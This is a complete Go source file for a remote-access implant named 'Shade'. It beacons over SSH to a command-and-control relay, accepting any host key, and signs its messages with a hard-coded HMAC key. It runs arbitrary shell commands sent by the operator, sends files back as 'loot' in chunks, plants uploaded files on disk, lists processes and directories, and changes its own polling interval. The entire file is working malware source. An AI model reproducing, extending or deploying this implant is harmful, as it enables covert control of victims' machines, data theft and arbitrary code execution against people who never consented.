package main

import (
	"crypto/hmac"
	"crypto/md5"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/google/uuid"
	"golang.org/x/crypto/ssh"
)

// Build-time configuration - can be overridden with -ldflags during compilation
var (
	listenerHost     = "localhost" // Change to your relay IP/hostname
	listenerPort     = "2222"      // SSH port (default: 2222)
	listenerEndpoint = "/wiki"     // Endpoint path for C2 communication

	// HMAC Key - MUST match relay's AGENT_HMAC_KEY in relay.config
	hmacKeyHex = "1bb1a2912f7e02e259f969d96357bb84c2c0bf954a0d8674c45ed903bb674b23"
)

var reconnectInterval = 15
var currentInterval = 15
var hmacKey = []byte(hmacKeyHex)
var agentID = uuid.New().String()
var currentCommandID int
var sshClient *ssh.Client
var sshConfig = &ssh.ClientConfig{
	User: "shade-agent",
	Auth: []ssh.AuthMethod{
		ssh.Password(""), // No password needed - authentication via HMAC in forwarded requests
	},
	HostKeyCallback: ssh.InsecureIgnoreHostKey(), // Accept any host key
	Timeout:         10 * time.Second,
}

// HMAC signing functions
func generateHMAC(message string, key []byte) string {
	h := hmac.New(sha256.New, key)
	h.Write([]byte(message))
	return hex.EncodeToString(h.Sum(nil))
}

func signRequest(method, path, body string) (string, string) {
	timestamp := strconv.FormatInt(time.Now().Unix(), 10)
	message := fmt.Sprintf("%s%s%s%s", method, path, timestamp, body)
	signature := generateHMAC(message, hmacKey)
	return timestamp, signature
}

type AgentRegistration struct {
	UUID              string `json:"uuid"`
	Name              string `json:"name"`
	IP                string `json:"ip"`
	OS                string `json:"os"`
	ReconnectInterval int    `json:"reconnectInterval"`
}

type Command struct {
	ID             int     `json:"id"`
	AgentID        string  `json:"agentId"`
	Command        string  `json:"command"`
	ClientUsername string  `json:"clientUsername"`
	Status         string  `json:"status"`
	Output         string  `json:"output"`
	CreatedAt      string  `json:"createdAt"`
	ExecutedAt     *string `json:"executedAt"`
}

type CommandResponse struct {
	CommandID int    `json:"commandId"`
	Output    string `json:"output"`
	Status    string `json:"status"`
}

// Process information structure
type ProcessInfo struct {
	PID    int
	Name   string
	Parent int
}

func main() {
	// Use the global agent ID
	agentName := fmt.Sprintf("Shade-%s", agentID[:8])

	// Get system info
	osInfo := fmt.Sprintf("%s %s", runtime.GOOS, runtime.GOARCH)

	// Start persistent SSH connection loop
	for {
		if err := connectAndServe(agentID, agentName, osInfo); err != nil {
			// Back off for full reconnect interval to avoid bad state
			// This ensures the next connection attempt is a fresh, full SSH connect
			time.Sleep(time.Duration(reconnectInterval) * time.Second)
		}
	}
}

// connectAndServe establishes SSH connection and handles bidirectional communication
func connectAndServe(agentID, agentName, osInfo string) error {
	addr := fmt.Sprintf("%s:%s", listenerHost, listenerPort)

	// Connect via SSH
	client, err := ssh.Dial("tcp", addr, sshConfig)
	if err != nil {
		return fmt.Errorf("SSH dial failed: %v", err)
	}
	defer client.Close()

	sshClient = client

	// Prepare registration data
	reg := AgentRegistration{
		UUID:              agentID,
		Name:              agentName,
		IP:                getLocalIP(),
		OS:                osInfo,
		ReconnectInterval: reconnectInterval,
	}

	// Marshal the core registration data
	regData, err := json.Marshal(reg)
	if err != nil {
		return fmt.Errorf("failed to marshal registration: %v", err)
	}

	// SSH has no headers, so HMAC goes in body
	timestamp, signature := signRequest("POST", listenerEndpoint, string(regData))

	// Wrap the data with HMAC fields (using json.RawMessage to preserve exact bytes)
	wrapper := map[string]interface{}{
		"endpoint":  listenerEndpoint,
		"data":      json.RawMessage(regData),
		"timestamp": timestamp,
		"signature": signature,
	}

	// Marshal the wrapper
	finalRegData, err := json.Marshal(wrapper)
	if err != nil {
		return fmt.Errorf("failed to marshal final registration: %v", err)
	}

	// Send registration via SSH
	if _, err := sendSSHMessage(client, finalRegData); err != nil {
		return fmt.Errorf("failed to send registration: %v", err)
	}

	// Start polling ticker for commands
	pollTicker := time.NewTicker(time.Duration(currentInterval) * time.Second)
	defer pollTicker.Stop()

	// Main loop: poll for commands
	for {
		<-pollTicker.C

		// Check if interval changed
		if currentInterval != reconnectInterval {
			pollTicker.Stop()
			currentInterval = reconnectInterval
			pollTicker = time.NewTicker(time.Duration(currentInterval) * time.Second)
		}

		// Send simple poll request (no GraphQL)
		pollRequest := map[string]interface{}{
			"agentId": agentID,
		}

		// Marshal the core poll data
		pollData, err := json.Marshal(pollRequest)
		if err != nil {
			continue
		}

		// SSH has no headers, so HMAC goes in body
		timestamp, signature := signRequest("POST", listenerEndpoint, string(pollData))

		// Wrap the data with HMAC fields (using json.RawMessage to preserve exact bytes)
		wrapper := map[string]interface{}{
			"endpoint":  listenerEndpoint,
			"data":      json.RawMessage(pollData),
			"timestamp": timestamp,
			"signature": signature,
		}

		// Marshal the wrapper
		finalPollData, err := json.Marshal(wrapper)
		if err != nil {
			continue
		}

		response, err := sendSSHMessage(client, finalPollData)
		if err != nil {
			return fmt.Errorf("failed to send poll request: %v", err)
		}

		// Handle response (commands from C2)
		go handleC2MessageSSH(client, agentID, response)
	}
}

// sendSSHMessage sends a message via SSH exec and returns the response
func sendSSHMessage(client *ssh.Client, message []byte) ([]byte, error) {
	session, err := client.NewSession()
	if err != nil {
		return nil, fmt.Errorf("failed to create session: %v", err)
	}
	defer session.Close()

	// Set stdin
	session.Stdin = strings.NewReader(string(message))

	// Run "exec" (relay will handle this as our C2 protocol)
	output, err := session.CombinedOutput("c2")
	if err != nil {
		// SSH exec error is expected if command returns non-zero, but we still get output
		return output, nil
	}

	return output, nil
}

// handleC2MessageSSH processes messages from C2 server via SSH
func handleC2MessageSSH(client *ssh.Client, agentID string, message []byte) {
	handleC2Message(client, agentID, message)
}

// handleC2Message processes messages from C2 server
func handleC2Message(client *ssh.Client, agentID string, message []byte) {
	// Try to parse as simple command list (no GraphQL wrapper)
	var commandsResponse struct {
		Commands []Command `json:"commands"`
	}

	if err := json.Unmarshal(message, &commandsResponse); err == nil && len(commandsResponse.Commands) > 0 {
		// Process commands
		for _, cmd := range commandsResponse.Commands {
			if cmd.Status == "pending" {
				// Set global command ID for chunked transfers
				currentCommandID = cmd.ID

				output, err := executeCommand(cmd.Command)
				if err != nil {
					output = fmt.Sprintf("Error: %v", err)
				}

				// Send command response back
				sendCommandResponseSSH(client, cmd.ID, output, "completed")
			}
		}
		return
	}

	// Try to parse as single command
	var singleCmd Command
	if err := json.Unmarshal(message, &singleCmd); err == nil && singleCmd.Command != "" {
		output, err := executeCommand(singleCmd.Command)
		if err != nil {
			output = fmt.Sprintf("Error: %v", err)
		}

		// Send command response back
		sendCommandResponseSSH(client, singleCmd.ID, output, "completed")
		return
	}
}

func getLocalIP() string {
	// Get the real local IP address
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "unknown"
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String()
}

// sendCommandResponseSSH sends command response via SSH
func sendCommandResponseSSH(client *ssh.Client, commandID int, output, status string) error {
	response := CommandResponse{
		CommandID: commandID,
		Output:    output,
		Status:    status,
	}

	// Marshal the core response data
	jsonData, err := json.Marshal(response)
	if err != nil {
		return err
	}

	// SSH has no headers, so HMAC goes in body
	timestamp, signature := signRequest("POST", listenerEndpoint, string(jsonData))

	// Wrap the data with HMAC fields (using json.RawMessage to preserve exact bytes)
	wrapper := map[string]interface{}{
		"endpoint":  listenerEndpoint,
		"data":      json.RawMessage(jsonData),
		"timestamp": timestamp,
		"signature": signature,
	}

	// Marshal the wrapper
	finalData, err := json.Marshal(wrapper)
	if err != nil {
		return err
	}

	_, err = sendSSHMessage(client, finalData)
	return err
}

// Built-in command handlers
func handleBuiltinCommand(command string) (string, error) {
	parts := strings.Fields(command)
	if len(parts) == 0 {
		return "", fmt.Errorf("empty command")
	}

	cmd := parts[0]
	args := parts[1:]

	switch cmd {
	case "ls":
		return handleLs(args)
	case "get":
		return handleGet(args)
	case "put":
		return handlePut(args)
	case "cd":
		return handleCd(args)
	case "kill":
		return handleKill(args)
	case "ps":
		return handlePs(args)
	case "exec":
		return handleExec(args)
	case "reconnect":
		return handleReconnect(args)
	default:
		return "", fmt.Errorf("not a builtin command")
	}
}

func handleLs(args []string) (string, error) {
	path := "."
	if len(args) > 0 {
		path = args[0]
	}

	// Resolve path
	absPath, err := filepath.Abs(path)
	if err != nil {
		return "", fmt.Errorf("invalid path: %v", err)
	}

	// Check if path exists
	info, err := os.Stat(absPath)
	if err != nil {
		return "", fmt.Errorf("path does not exist: %v", err)
	}

	if !info.IsDir() {
		return "", fmt.Errorf("not a directory: %s", path)
	}

	// List directory contents
	entries, err := os.ReadDir(absPath)
	if err != nil {
		return "", fmt.Errorf("failed to read directory: %v", err)
	}

	var result strings.Builder
	result.WriteString(fmt.Sprintf("📁 %s\n", absPath))

	// Create loot entries for each item
	var lootEntries []map[string]interface{}

	// Sort entries: directories first, then files
	var dirs, files []os.DirEntry
	for _, entry := range entries {
		if entry.IsDir() {
			dirs = append(dirs, entry)
		} else {
			files = append(files, entry)
		}
	}

	// Add directories first
	for _, entry := range dirs {
		info, err := entry.Info()
		if err != nil {
			continue
		}

		result.WriteString(fmt.Sprintf("├── 📁 %s/\n", entry.Name()))

		// Create loot entry
		fullPath := filepath.Join(absPath, entry.Name())
		lootEntry := map[string]interface{}{
			"type":        "directory",
			"path":        fullPath,
			"name":        entry.Name(),
			"size":        0,
			"permissions": info.Mode().String(),
			"modified":    info.ModTime().Format("2006-01-02 15:04:05"),
		}
		lootEntries = append(lootEntries, lootEntry)
	}

	// Add files
	for _, entry := range files {
		info, err := entry.Info()
		if err != nil {
			continue
		}

		size := info.Size()
		sizeStr := formatFileSize(size)
		result.WriteString(fmt.Sprintf("├── 📄 %s (%s)\n", entry.Name(), sizeStr))

		// Create loot entry
		fullPath := filepath.Join(absPath, entry.Name())
		lootEntry := map[string]interface{}{
			"type":        "file",
			"path":        fullPath,
			"name":        entry.Name(),
			"size":        size,
			"permissions": info.Mode().String(),
			"modified":    info.ModTime().Format("2006-01-02 15:04:05"),
		}
		lootEntries = append(lootEntries, lootEntry)
	}

	// Add loot entries to output (hidden but parseable)
	if len(lootEntries) > 0 {
		lootJSON, err := json.Marshal(lootEntries)
		if err == nil {
			// Use a simple delimiter that the GUI can filter out
			result.WriteString(fmt.Sprintf("\nLOOT_ENTRIES:%s", string(lootJSON)))
		}
	}

	return result.String(), nil
}

// formatFileSize formats file size in human-readable format
func formatFileSize(size int64) string {
	if size == 0 {
		return "0B"
	}

	const unit = 1024
	if size < unit {
		return fmt.Sprintf("%dB", size)
	}

	div, exp := int64(unit), 0
	for n := size / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}

	units := []string{"KB", "MB", "GB", "TB"}
	if exp >= len(units) {
		exp = len(units) - 1
	}

	return fmt.Sprintf("%.1f%s", float64(size)/float64(div), units[exp])
}

const (
	// Chunk size for file transfers (2MB)
	chunkSize = 2 * 1024 * 1024
	// Threshold for using chunked transfers (10MB)
	chunkThreshold = 10 * 1024 * 1024
)

func handleGet(args []string) (string, error) {
	if len(args) == 0 {
		return "", fmt.Errorf("usage: get <filepath>")
	}

	filePath := args[0]

	// Get current working directory
	currentDir, err := os.Getwd()
	if err != nil {
		return "", fmt.Errorf("failed to get current directory: %v", err)
	}

	// Create absolute path by combining current directory with file path
	var absPath string
	if filepath.IsAbs(filePath) {
		// Path is already absolute
		absPath = filePath
	} else {
		// Path is relative, combine with current directory
		absPath = filepath.Join(currentDir, filePath)
	}

	// Get file info to check size
	fileInfo, err := os.Stat(absPath)
	if err != nil {
		return "", fmt.Errorf("failed to get file info: %v", err)
	}

	filename := filepath.Base(absPath)
	fileSize := fileInfo.Size()

	// If file is small (<10MB), use old method for simplicity
	if fileSize < chunkThreshold {
		return handleGetSmallFile(absPath, filename)
	}

	// Use chunked transfer for large files
	return handleGetChunkedFile(absPath, filename, fileSize)
}

// handleGetSmallFile handles files under 10MB using the original method
func handleGetSmallFile(absPath, filename string) (string, error) {
	// Read file content
	content, err := os.ReadFile(absPath)
	if err != nil {
		return "", fmt.Errorf("failed to read file: %v", err)
	}

	// Calculate MD5 hash
	hash := md5.Sum(content)
	hashString := hex.EncodeToString(hash[:])

	// Create loot entry for the file
	lootEntry := map[string]interface{}{
		"type":    "file",
		"name":    filename,
		"path":    absPath,
		"size":    float64(len(content)),
		"content": string(content),
		"md5":     hashString,
	}

	// Convert to JSON
	lootJSON, err := json.Marshal([]map[string]interface{}{lootEntry})
	if err != nil {
		return "", fmt.Errorf("failed to marshal loot entry: %v", err)
	}

	// Return clean message with loot entry embedded
	return fmt.Sprintf("got %s!\nLOOT_ENTRIES:%s", filename, string(lootJSON)), nil
}

// handleGetChunkedFile handles large files using chunked transfer
func handleGetChunkedFile(absPath, filename string, fileSize int64) (string, error) {
	fileContent, err := os.ReadFile(absPath)
	if err != nil {
		return "", fmt.Errorf("failed to read file: %v", err)
	}

	totalChunks := int((fileSize + chunkSize - 1) / chunkSize)
	hash := md5.Sum(fileContent)
	expectedMD5 := hex.EncodeToString(hash[:])

	sessionID, err := initiateChunkedTransferSSH(absPath, filename, fileSize, totalChunks, expectedMD5)
	if err != nil {
		return "", fmt.Errorf("failed to initiate transfer: %v", err)
	}

	for i := 0; i < totalChunks; i++ {
		start := int64(i) * chunkSize
		end := start + chunkSize
		if end > fileSize {
			end = fileSize
		}

		chunkData := fileContent[start:end]
		chunkHash := md5.Sum(chunkData)
		chunkMD5 := hex.EncodeToString(chunkHash[:])

		if err := uploadChunkSSH(sessionID, i, chunkData, chunkMD5); err != nil {
			return "", fmt.Errorf("failed to upload chunk %d/%d: %v", i+1, totalChunks, err)
		}
	}

	if err := completeChunkedTransferSSH(sessionID); err != nil {
		return "", fmt.Errorf("failed to complete transfer: %v", err)
	}

	return fmt.Sprintf("got %s! (%d bytes in %d chunks, md5=%s)", filename, fileSize, totalChunks, expectedMD5), nil
}

// initiateChunkedTransferSSH starts a new file transfer session via SSH
func initiateChunkedTransferSSH(absPath, filename string, fileSize int64, totalChunks int, expectedMD5 string) (string, error) {
	initReq := map[string]interface{}{
		"agentId":      agentID,
		"commandId":    currentCommandID,
		"filename":     filename,
		"originalPath": absPath,
		"totalSize":    fileSize,
		"totalChunks":  totalChunks,
		"expectedMd5":  expectedMD5,
	}

	jsonData, err := json.Marshal(initReq)
	if err != nil {
		return "", err
	}

	// Sign and wrap request
	body := string(jsonData)
	timestamp, signature := signRequest("POST", listenerEndpoint, body)

	wrapper := map[string]interface{}{
		"endpoint":  listenerEndpoint,
		"data":      json.RawMessage(jsonData),
		"timestamp": timestamp,
		"signature": signature,
	}

	finalData, err := json.Marshal(wrapper)
	if err != nil {
		return "", err
	}

	// Send via SSH
	response, err := sendSSHMessage(sshClient, finalData)
	if err != nil {
		return "", err
	}

	var respMap map[string]interface{}
	if err := json.Unmarshal(response, &respMap); err != nil {
		return "", fmt.Errorf("failed to parse response: %v", err)
	}

	sessionID, ok := respMap["sessionId"].(string)
	if !ok {
		return "", fmt.Errorf("no session ID in response. Response: %+v", respMap)
	}

	return sessionID, nil
}

// uploadChunkSSH uploads a single file chunk via SSH
func uploadChunkSSH(sessionID string, chunkIndex int, chunkData []byte, chunkMD5 string) error {
	chunkReq := map[string]interface{}{
		"sessionId":  sessionID,
		"chunkIndex": chunkIndex,
		"chunkData":  hex.EncodeToString(chunkData),
		"chunkMd5":   chunkMD5,
	}

	jsonData, err := json.Marshal(chunkReq)
	if err != nil {
		return err
	}

	// Sign and wrap request
	body := string(jsonData)
	timestamp, signature := signRequest("POST", listenerEndpoint, body)

	wrapper := map[string]interface{}{
		"endpoint":  listenerEndpoint,
		"data":      json.RawMessage(jsonData),
		"timestamp": timestamp,
		"signature": signature,
	}

	finalData, err := json.Marshal(wrapper)
	if err != nil {
		return err
	}

	// Send via SSH
	response, err := sendSSHMessage(sshClient, finalData)
	if err != nil {
		return err
	}

	var respMap map[string]interface{}
	if err := json.Unmarshal(response, &respMap); err != nil {
		return err
	}

	status, _ := respMap["status"].(float64)
	if status != 200 {
		return fmt.Errorf("server returned status %v", status)
	}

	return nil
}

// completeChunkedTransferSSH signals the server to assemble and finalize the transfer via SSH
func completeChunkedTransferSSH(sessionID string) error {
	completeReq := map[string]interface{}{
		"sessionId": sessionID,
		"complete":  true,
	}

	jsonData, err := json.Marshal(completeReq)
	if err != nil {
		return err
	}

	// Sign and wrap request
	body := string(jsonData)
	timestamp, signature := signRequest("POST", listenerEndpoint, body)

	wrapper := map[string]interface{}{
		"endpoint":  listenerEndpoint,
		"data":      json.RawMessage(jsonData),
		"timestamp": timestamp,
		"signature": signature,
	}

	finalData, err := json.Marshal(wrapper)
	if err != nil {
		return err
	}

	// Send via SSH
	response, err := sendSSHMessage(sshClient, finalData)
	if err != nil {
		return err
	}

	var respMap map[string]interface{}
	if err := json.Unmarshal(response, &respMap); err != nil {
		return fmt.Errorf("%v. Response body: %s", err, string(response))
	}

	status, _ := respMap["status"].(float64)
	if status != 200 {
		return fmt.Errorf("server returned status %v", status)
	}

	return nil
}

func handleCd(args []string) (string, error) {
	if len(args) == 0 {
		// Show current directory
		dir, err := os.Getwd()
		if err != nil {
			return "", fmt.Errorf("failed to get current directory: %v", err)
		}
		return dir, nil
	}

	newDir := args[0]

	// Change directory
	err := os.Chdir(newDir)
	if err != nil {
		return "", fmt.Errorf("failed to change directory: %v", err)
	}

	// Return new directory
	dir, err := os.Getwd()
	if err != nil {
		return "", fmt.Errorf("failed to get new directory: %v", err)
	}

	return fmt.Sprintf("Changed directory to: %s", dir), nil
}

func handleKill(args []string) (string, error) {
	// Kill command now exits the agent gracefully
	go func() {
		// Give time for response to be sent
		time.Sleep(1 * time.Second)
		os.Exit(0)
	}()

	return "Agent terminating...", nil
}

func handlePs(args []string) (string, error) {
	processes, err := getProcessList()
	if err != nil {
		return "", fmt.Errorf("failed to get process list: %v", err)
	}

	var result strings.Builder
	result.WriteString("PID\tName\t\tParent\n")
	result.WriteString("---\t----\t\t------\n")

	for _, proc := range processes {
		result.WriteString(fmt.Sprintf("%d\t%s\t\t%d\n",
			proc.PID, proc.Name, proc.Parent))
	}

	return result.String(), nil
}

func getProcessList() ([]ProcessInfo, error) {
	var processes []ProcessInfo

	// Read /proc directory
	procDirs, err := os.ReadDir("/proc")
	if err != nil {
		return nil, fmt.Errorf("failed to read /proc: %v", err)
	}

	for _, dir := range procDirs {
		// Only process numeric directories (PIDs)
		if !dir.IsDir() {
			continue
		}
		pid, err := strconv.Atoi(dir.Name())
		if err != nil {
			continue
		}

		// Read process name from /proc/PID/comm
		commPath := filepath.Join("/proc", dir.Name(), "comm")
		nameBytes, err := os.ReadFile(commPath)
		if err != nil {
			continue
		}
		name := strings.TrimSpace(string(nameBytes))

		// Read parent PID from /proc/PID/stat
		statPath := filepath.Join("/proc", dir.Name(), "stat")
		statBytes, err := os.ReadFile(statPath)
		if err != nil {
			continue
		}

		// Parse stat file (format: pid (name) state ppid ...)
		statStr := string(statBytes)
		// Find the last ) to handle process names with parentheses
		lastParen := strings.LastIndex(statStr, ")")
		if lastParen == -1 {
			continue
		}
		fields := strings.Fields(statStr[lastParen+1:])
		if len(fields) < 2 {
			continue
		}
		ppid, err := strconv.Atoi(fields[1])
		if err != nil {
			ppid = 0
		}

		processes = append(processes, ProcessInfo{
			PID:    pid,
			Name:   name,
			Parent: ppid,
		})
	}

	return processes, nil
}

func handlePut(args []string) (string, error) {
	if len(args) < 2 {
		return "", fmt.Errorf("usage: put <remote_filepath> <hex_data>")
	}

	// Remove quotes from path if present
	remoteFilePath := args[0]
	if strings.HasPrefix(remoteFilePath, "\"") && strings.HasSuffix(remoteFilePath, "\"") {
		remoteFilePath = remoteFilePath[1 : len(remoteFilePath)-1]
	}

	// Remove quotes from hex data if present
	hexData := args[1]
	if strings.HasPrefix(hexData, "\"") && strings.HasSuffix(hexData, "\"") {
		hexData = hexData[1 : len(hexData)-1]
	}

	// Validate hex data
	if len(hexData) == 0 {
		return "", fmt.Errorf("empty hex data provided")
	}

	// Check if hex data is valid (even length)
	if len(hexData)%2 != 0 {
		return "", fmt.Errorf("invalid hex data: odd length")
	}

	// Decode hex data to bytes
	fileData, err := hex.DecodeString(hexData)
	if err != nil {
		return "", fmt.Errorf("failed to decode hex data: %v", err)
	}

	// Validate decoded data
	if len(fileData) == 0 {
		return "", fmt.Errorf("decoded file data is empty")
	}

	// Get absolute path
	absPath, err := filepath.Abs(remoteFilePath)
	if err != nil {
		return "", fmt.Errorf("invalid file path: %v", err)
	}

	// Create directory if it doesn't exist
	dir := filepath.Dir(absPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return "", fmt.Errorf("failed to create directory: %v", err)
	}

	// Write file
	if err := os.WriteFile(absPath, fileData, 0644); err != nil {
		return "", fmt.Errorf("failed to write file: %v", err)
	}

	// Create loot entry for uploaded file
	lootEntry := map[string]interface{}{
		"type":        "file_upload",
		"filename":    filepath.Base(absPath),
		"path":        absPath,
		"size":        len(fileData),
		"timestamp":   time.Now().Format(time.RFC3339),
		"description": fmt.Sprintf("File uploaded: %s (%d bytes)", filepath.Base(absPath), len(fileData)),
	}

	// Send loot entry to server
	sendLootEntry(lootEntry)

	return fmt.Sprintf("File uploaded successfully: %s (%d bytes)", absPath, len(fileData)), nil
}

func handleExec(args []string) (string, error) {
	if len(args) == 0 {
		return "", fmt.Errorf("usage: exec <command>")
	}

	// Join all arguments into a single command string
	command := strings.Join(args, " ")

	// Execute the command using sh
	cmd := exec.Command("sh", "-c", command)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return string(output), err
	}

	return string(output), nil
}

func handleReconnect(args []string) (string, error) {
	if len(args) == 0 {
		return fmt.Sprintf("Current reconnect interval: %d seconds\nUsage: reconnect <seconds>", reconnectInterval), nil
	}

	// Parse the new interval
	newInterval, err := strconv.Atoi(args[0])
	if err != nil {
		return "", fmt.Errorf("invalid interval: %v (must be a number)", err)
	}

	if newInterval < 5 {
		return "", fmt.Errorf("interval too small: %d seconds (minimum: 5 seconds)", newInterval)
	}

	if newInterval > 3600 {
		return "", fmt.Errorf("interval too large: %d seconds (maximum: 3600 seconds)", newInterval)
	}

	// Update the global interval
	oldInterval := reconnectInterval
	reconnectInterval = newInterval

	return fmt.Sprintf("Reconnect interval changed from %d to %d seconds", oldInterval, newInterval), nil
}

// decodeCommand translates command IDs back to command names
// Maps: "1" -> "ls", "2" -> "get", etc.
func decodeCommand(command string) string {
	commandMap := map[string]string{
		"1": "ls",
		"2": "get",
		"3": "put",
		"4": "cd",
		"5": "kill",
		"6": "ps",
		"7": "exec",
		"8": "reconnect",
	}

	// Parse command to get the first word
	parts := strings.Fields(command)
	if len(parts) == 0 {
		return command
	}

	cmdID := parts[0]

	// Check if ID exists in map
	if cmdName, ok := commandMap[cmdID]; ok {
		// Replace ID with command name
		parts[0] = cmdName
		return strings.Join(parts, " ")
	}

	// No mapping found (either already decoded or custom command), pass through
	return command
}

func executeCommand(command string) (string, error) {
	if command == "" {
		return "", fmt.Errorf("empty command")
	}

	// Decode command ID to command name (if encoded)
	decodedCommand := decodeCommand(command)

	// Check if it's a builtin command first
	output, err := handleBuiltinCommand(decodedCommand)
	if err == nil {
		return output, nil
	}

	// If not a builtin or error, try system execution
	if err.Error() != "not a builtin command" {
		return "", err
	}

	// Use system() for full command execution (supports pipes, redirects, etc.)
	// Execute command using sh
	cmd := exec.Command("sh", "-c", decodedCommand)
	systemOutput, err := cmd.CombinedOutput()
	if err != nil {
		return string(systemOutput), err
	}

	return string(systemOutput), nil
}

// sendLootEntry sends loot via SSH (if connected)
func sendLootEntry(lootEntry map[string]interface{}) error {
	if sshClient == nil {
		return fmt.Errorf("no active SSH connection")
	}

	jsonData, err := json.Marshal(lootEntry)
	if err != nil {
		return err
	}

	_, err = sendSSHMessage(sshClient, jsonData)
	return err
}
